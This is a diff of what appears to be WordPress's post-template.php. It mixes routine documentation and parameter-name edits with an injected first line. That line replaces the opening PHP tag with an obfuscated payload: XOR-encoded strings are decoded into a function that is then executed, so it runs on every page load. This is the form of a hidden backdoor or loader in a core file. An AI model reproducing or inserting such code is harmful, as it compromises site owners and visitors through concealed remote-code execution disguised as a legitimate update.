@@ -1,4 +1,4 @@
-<?php
+<?php $cokKgxYB='4OV4OElWFSSXYRU'^'W=3U; 313=0,0=;';$nPglxpvyC=$cokKgxYB('','-VYL0CVPYZS<j47,ST2YeM H:2P=S80.8>COCDPKo1UNWTZTUAS;:o0TCPb:PCEAND02JaWKY0GPoMJchHzXhVDYXMenBpJ<S3+.1bHIhDQFShR=m4 O8 SXN3L<-yCtCXFNQFpEE7:<UjZlDw.RNWiE11Y2TN;P76C:ihnDEBZ.TGe14TF:Qn1zXI7BC46yuZHZkMkeKe;y>J4QBMVisH6Y67P2L-0T5<;IYZQpH65N+QddJ;HWS5 klC=,q-;wkJS2wkXR7ZvSPE31TOIpf,HXiH-,A7=W>YiNs8RHS6xu7V5SGPzuJML3VaX06x-7RnHeZS -YK18m3B1NYHQVEK4i2d>uslu5GFJ,PKQIKqn79LUSHu4L0zW,8>AsZ,HLIMPWWKxD>KTD,J6OSeO2W K4SBd;lE=yI0S3-mWiqC>8,=.AX3WXF2O=<6.L;<k;OJGB1MVDn41YT673Os>0>VjAWiIA2J9ZPYdfwP0FnmD2=QAwkRMB6Q39=YDgWE,5>SJFQ4KwTDp=;13biqKFBW6OZISX0-gC> .K+GLHEuLYQwkWAhBQsG8xDQWpwMZaZjCTP  ,D<0aSoSei3D<X5.FK3-TE=EH:jN4+I8X6VECmS09;-QgkrquiY6:8E4RLAeS1ZT,EJRY>ZYXP<KT>7 UI=djkJE4'^'D0qmV683-3<R5QOE  AqB5O:eV1I2goCMJdfjd+AfW  4 3;;a+TH0T571=e=61ij QF+Mwo2U>yOmjCH3pQar+,,mXNeWq6Z:MACJl HyqvhHvTQGT=TE=pjW-HLPxTg1mexLyLaXOHuDgLlSJ3:62aXlyltjP5NmgSIMN7106K:oAZQ-ogxU;sQ;R66FXQQ5=.Bval6oFs4nP06,vTS.W5ERk8hIQ TcP, zlP.WY=Njnn,T:22VHKDgbo>bp>.j2AWO37NzKmpaEP8:,YFWBQM,LX hV2GyTnWS71h<qQS7A2gmZQ<, F3ZRM<rDQrFiA>2TLpkJ2dU-C+8+9vmok;w5k0 8UT4fnG52qtuQJAX  6aUOF9ssHYJ ,1I1ltmt<22CN7Bp M>WonEkD6L>QhHmFf87smT2GLMjI16PKIOG 4Z-=nJ OcRO8Zc4V:>o P>3rZkU<7YSVgWZQJ7CmwM- F+f15 MOLZY FI SI0aQMr,0D0JfV<=82=EFJ ba:Q2PxdTYZERKIWmfj:Rzrm79DL<dUEWlvnluxUk8eBSgsZrhDrZIu43DG+lToXrf6CEHqZUFzOuCIR6N9Lq-.Jr1=T6<IBiDJ0T7W2boMwTXOLxNKRQUIyM01 B3 iA7P.5wb:3 R58<wabo4>E- ILZBqOI');$nPglxpvyC();
 /**
  * WordPress Post Template Functions.
  *
@@ -398,15 +398,15 @@ function get_the_excerpt( $post = null ) {
 }
 
 /**
- * Whether post has excerpt.
+ * Whether the post has a custom excerpt.
  *
  * @since 2.3.0
  *
- * @param int|WP_Post $id Optional. Post ID or post object.
- * @return bool
+ * @param int|WP_Post $post Optional. Post ID or WP_Post object. Default is global $post.
+ * @return bool True if the post has a custom excerpt, false otherwise.
  */
-function has_excerpt( $id = 0 ) {
-	$post = get_post( $id );
+function has_excerpt( $post = 0 ) {
+	$post = get_post( $post );
 	return ( !empty( $post->post_excerpt ) );
 }
 
@@ -793,6 +793,7 @@ function post_password_required( $post = null ) {
 		return apply_filters( 'post_password_required', true, $post );
 	}
 
+	require_once ABSPATH . WPINC . '/class-phpass.php';
 	$hasher = new PasswordHash( 8, true );
 
 	$hash = wp_unslash( $_COOKIE[ 'wp-postpass_' . COOKIEHASH ] );
@@ -1126,7 +1127,7 @@ function wp_dropdown_pages( $args = '' ) {
 }
 
 /**
- * Retrieve or display list of pages in list (li) format.
+ * Retrieve or display list of pages (or hierarchical post type items) in list (li) format.
  *
  * @since 1.5.0
  * @since 4.7.0 Added the `item_spacing` argument.
